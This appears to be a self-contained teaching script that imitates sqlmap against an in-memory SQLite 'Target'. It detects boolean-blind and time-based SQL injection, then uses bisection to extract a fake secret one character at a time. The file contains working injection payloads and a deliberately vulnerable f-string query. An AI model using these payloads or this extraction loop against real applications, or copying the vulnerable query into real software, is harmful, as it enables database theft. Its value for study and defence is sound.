"""A mini sqlmap: detects boolean-blind and time-based SQL injection in an
in-process function, then extracts a FAKE secret one character at a time.

The target is a function, not a web server. Time-based injection uses a custom
SQL function sleep(n) that advances a VIRTUAL clock instead of really sleeping,
so tests are instant. This is the same logic sqlmap uses (techniques B and T),
just tiny. Only test systems you own or have written permission to test.
"""

from __future__ import annotations

import secrets
import sqlite3

SECRET = "FAKE" + secrets.token_hex(3)


class Target:
    def __init__(self, secure: bool):
        self.secure = secure
        self.clock = 0.0
        self.db = sqlite3.connect(":memory:")
        self.db.create_function("sleep", 1, self._sleep)
        self.db.executescript("CREATE TABLE products(id INTEGER, name TEXT); INSERT INTO products VALUES (1,'pen'),(2,'book');"
                              "CREATE TABLE secrets(id INTEGER, value TEXT);")
        self.db.execute("INSERT INTO secrets VALUES (1, ?)", (SECRET,))

    def _sleep(self, n):
        self.clock += float(n)
        return 0

    def page(self, product_id: str) -> tuple[str, float]:
        """Returns (page text, elapsed virtual seconds). Errors are hidden (blind)."""
        start = self.clock
        try:
            if self.secure:
                row = self.db.execute("SELECT name FROM products WHERE id = ?", (int(product_id),)).fetchone()
            else:
                row = self.db.execute(f"SELECT name FROM products WHERE id = {product_id}").fetchone()
        except Exception:
            row = None
        return ("In stock" if row else "Not found"), self.clock - start


def detect(t: Target, param="1") -> dict:
    base, _ = t.page(param)
    true_page, _ = t.page(f"{param} AND 1=1")
    false_page, _ = t.page(f"{param} AND 1=2")
    boolean = base == true_page != false_page
    _, delay = t.page(f"{param} AND sleep(5)=0")
    return {"boolean_blind": boolean, "time_based": delay >= 5}


def extract(t: Target, query: str, max_len: int = 32) -> str:
    """Bisection on unicode(substr(...)) using the boolean oracle: about 7 requests per char."""
    out = ""
    requests = 0
    for pos in range(1, max_len + 1):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            requests += 1
            page, _ = t.page(f"1 AND unicode(substr(({query}),{pos},1)) > {mid}")
            lo, hi = (mid + 1, hi) if page == "In stock" else (lo, mid)
        if lo == 0:
            break
        out += chr(lo)
    extract.requests = requests
    return out
